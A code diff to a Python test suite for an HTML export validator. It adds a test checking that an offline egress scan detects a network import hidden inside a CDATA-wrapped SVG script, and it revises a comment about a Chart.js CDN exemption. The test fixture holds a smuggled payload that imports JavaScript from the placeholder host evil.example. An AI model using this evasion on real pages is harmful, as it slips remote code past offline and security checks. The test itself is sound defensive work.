@@ -1399,6 +1399,17 @@ class NewCheckTests(unittest.TestCase):
                 errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
                 self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))
 
+    def test_offline_egress_check_reads_a_cdata_wrapped_svg_script_body(self):
+        # CMH-VAL-29 is not only a false-positive fix: the dropped CDATA payload was also invisible
+        # to the offline EGRESS scan, which regex-scans the same captured body. An SVG script whose
+        # body is a section really runs, so a network import written there was real egress that
+        # `--strict` certified as offline-clean.
+        smuggled = ('<svg><script type="text/javascript">'
+                    '<![CDATA[import("https://evil.example/x.js");]]>'
+                    "</script></svg>")
+        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, smuggled))))
+        self.assertTrue(any("imports a network module" in e for e in errors), errors)
+
     # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
     # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
     # validator must keep accepting the repaired shape.
@@ -1621,9 +1632,12 @@ class NewCheckTests(unittest.TestCase):
                 self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                     for e in errors), (attr, errors))
 
-    # The Chart.js CDN opt-in is bound to `src`, because `check_charts` only validates a `src`
-    # loader's pinned version and SRI. Exempting an `href` would wave through a remote script with
-    # a chart-shaped filename that nothing else in the validator ever looks at.
+    # The Chart.js CDN opt-in stays bound to `src` as a deliberate NARROWING. `check_charts` does
+    # audit an SVG `href`/`xlink:href` loader's pinned version and SRI since CMH-VAL-27, so the
+    # old "nothing else looks at it" reason no longer holds - but the exemption is a hole punched
+    # in the self-contained guarantee for ONE documented opt-in, and widening it to a spelling no
+    # real document writes would give up a real guarantee for nothing. So an SVG-`href` CDN tag is
+    # a loader to `check_charts` and is still refused here, and the two verdicts are consistent.
     def test_the_chartjs_cdn_exemption_does_not_extend_to_a_script_href(self):
         for attr in ("href", "xlink:href"):
             with self.subTest(attr=attr):
